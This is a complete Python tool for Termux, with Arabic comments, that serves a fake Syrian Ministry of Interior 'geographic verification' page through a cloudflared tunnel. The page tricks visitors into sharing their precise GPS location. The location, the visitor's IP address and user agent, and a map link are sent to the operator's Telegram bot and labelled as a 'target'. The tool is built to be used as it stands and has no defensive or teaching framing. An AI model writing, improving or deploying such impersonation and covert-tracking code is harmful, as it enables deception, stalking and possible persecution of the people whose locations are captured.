import os
import subprocess
import time
import base64
import json
import re
import sys

# --- 1. مرحلة التثبيت الآلي وتصحيح المسارات ---
def boot_system():
    print("\033[96m[*] جاري فحص البيئة وتجهيز المحركات...\033[0m")
    
    # تثبيت مكتبات بايثون
    for lib in ['flask', 'requests']:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[93m[!] تثبيت مكتبة {lib}...\033[0m")
            subprocess.run([sys.executable, "-m", "pip", "install", lib])

    # تثبيت الأدوات الخارجية في Termux
    try:
        # استخدام command -v كبديل لـ which لتجنب الخطأ الظاهر في صورتك
        check = subprocess.run("command -v cloudflared", shell=True, capture_output=True)
        if check.returncode != 0:
            print("\033[93m[!] أداة cloudflared مفقودة. جاري التثبيت...\033[0m")
            subprocess.run("pkg install cloudflared php -y", shell=True)
    except:
        pass

boot_system()

from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
RED, GREEN, CYAN, YELLOW, END = '\033[91m', '\033[92m', '\033[96m', '\033[93m', '\033[0m'
CONFIG_FILE = ".env_config.json"

def get_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f: return json.load(f)
    print(f"{CYAN}⚙️ إعدادات التلجرام لأول مرة:{END}")
    token = input(f"{YELLOW}  [>] Bot Token: {END}").strip()
    chat_id = input(f"{YELLOW}  [>] Chat ID: {END}").strip()
    config = {"token": token, "chat_id": chat_id}
    with open(CONFIG_FILE, "w") as f: json.dump(config, f)
    return config

config = get_config()
TOKEN, CID = config["token"], config["chat_id"]

def send_to_tg(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
    except: pass

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة وزارة الداخلية - الاستعلام الأمني</title>
    <style>
        body { font-family: Arial; background: #0b0e14; color: white; text-align: center; padding: 40px; }
        .card { background: #151921; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; border: 2px solid #1a73e8; }
        .btn { background: #1a73e8; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Emblem_of_Syria_%282025%E2%80%93present%29.svg/500px-Emblem_of_Syria_%282025%E2%80%93present%29.svg.png" width="80">
        <h2>نظام التحقق الجغرافي</h2>
        <p>لتأمين دخولك القانوني، يرجى السماح بمشاركة الموقع الجغرافي لمطابقته مع النطاق المحلي.</p>
        <button class="btn" onclick="track()">بدء المطابقة الآن</button>
    </div>
    <script>
        function track() {
            navigator.geolocation.getCurrentPosition(p => {
                let mock = (p.coords.accuracy <= 1) ? "⚠️ مشبوه (Fake GPS)" : "✅ حقيقي";
                let d = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, mock: mock, ua: navigator.userAgent };
                fetch('/log?d=' + btoa(JSON.stringify(d))).then(() => {
                    alert("تمت المطابقة بنجاح."); window.location.href = "https://moi.gov.sy";
                });
            }, () => alert("يجب السماح بالوصول للموقع للمتابعة."), {enableHighAccuracy: true});
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log')
def log():
    d_enc = request.args.get('d')
    if d_enc:
        data = json.loads(base64.b64decode(d_enc).decode('utf-8'))
        map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
        report = (
            f"🎯 *تم رصد هدف جديد*\n\n"
            f"📍 [اضغط لفتح الخريطة]({map_url})\n"
            f"🛡️ *الحالة:* {data['mock']}\n"
            f"📡 *الدقة:* {data['acc']} متر\n"
            f"🌐 *IP:* `{request.remote_addr}`"
        )
        send_to_tg(report)
        print(f"{GREEN}[+] تم إرسال البيانات للتلجرام.{END}")
    return "OK"

if __name__ == "__main__":
    if os.path.exists("tunnel.log"): os.remove("tunnel.log")
    print(f"{CYAN}[*] جاري إنشاء نفق التوصيل...{END}")
    subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:8080 > tunnel.log 2>&1", shell=True)
    
    time.sleep(15) # وقت كافٍ لاستقرار الإنترنت
    
    try:
        with open("tunnel.log", "r") as f:
            urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
            if urls:
                print(f"{GREEN}🚀 النظام جاهز. الرابط العام: {urls[0]}{END}")
                send_to_tg(f"🛡️ *النظام متصل*\n\nالرابط للهدف:\n`{urls[0]}`")
            else:
                print(f"{RED}[!] لم يتم الحصول على الرابط. تحقق من اتصالك.{END}")
    except: pass

    app.run(host='0.0.0.0', port=8080)
